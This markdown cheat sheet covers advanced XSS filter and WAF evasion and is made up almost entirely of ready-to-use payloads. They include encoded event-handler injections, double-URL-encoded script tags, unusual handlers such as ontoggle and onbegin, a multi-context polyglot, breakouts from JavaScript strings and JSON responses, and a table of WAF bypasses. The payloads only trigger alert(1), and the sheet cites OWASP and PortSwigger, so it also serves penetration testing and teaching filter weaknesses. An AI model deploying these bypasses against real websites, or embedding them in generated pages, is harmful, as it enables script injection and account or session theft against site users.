# 01 — Reflected & Stored XSS: Advanced Evasion

## Overview

Reflected and stored XSS are the most common XSS types, but modern defenses make basic payloads ineffective. This document covers advanced techniques to bypass sanitization and WAF rules.

---

## Filter Bypass via Encoding Chains

Web Application Firewalls inspect raw input but browsers perform multi-pass decoding. Encoding chains exploit this gap.

### HTML Entity Encoding

```html
<!-- Decimal entities -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Hex entities -->
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">XSS</a>
```

### URL Encoding (Double Encoded)

```
%253Cscript%253Ealert(1)%253C/script%253E
```

### Unicode Normalization

```javascript
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:alert(1)
```

---

## Tag and Attribute Evasion

### Unusual Event Handlers

When `onload`, `onerror`, `onclick` are blocked:

```html
<details open ontoggle=alert(1)>
<video autoplay onplay=alert(1)><source src=x></video>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<marquee onstart=alert(1)>XSS</marquee>
<body onpageshow=alert(1)>
```

### Attribute Delimiter Tricks

```html
<!-- No quotes needed in some contexts -->
<img src=x onerror=alert(1)>

<!-- Backtick as delimiter (IE) -->
<img src=`javascript:alert(1)`>

<!-- Null byte injection -->
<scr\x00ipt>alert(1)</scr\x00ipt>
```

---

## Polyglot Payloads

Polyglots execute in multiple injection contexts simultaneously:

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>
```

```html
<!-- Works in HTML, attribute, and JS string contexts -->
'"><img src=x onerror=alert(1)>
```

---

## Context-Specific Injection

### Inside JavaScript Strings

```javascript
// Payload: '; alert(1); //
var x = 'USER_INPUT';  →  var x = ''; alert(1); //';
```

### Inside HTML Attributes

```html
<!-- href attribute -->
<a href="javascript:alert(1)">link</a>

<!-- Data attribute reflected into eval -->
<div data-value="USER">  →  eval(element.dataset.value)
```

### Inside JSON Responses

```
HTTP/1.1 200 OK
Content-Type: text/html  ← missing application/json

{"user":"</script><script>alert(1)</script>"}
```

---

## WAF Bypass Techniques

| WAF Rule Blocked | Bypass Technique |
|-----------------|-----------------|
| `<script>` tag | Case variation: `<ScRiPt>` |
| `alert(` | `alert\`1\`` (template literal) |
| `javascript:` | `jaVasCript:` |
| Event handler keywords | Unicode: `onc\u006Cick` |
| `/` in payload | Double URL encode: `%252F` |

---

## References

- [OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PortSwigger XSS Contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)
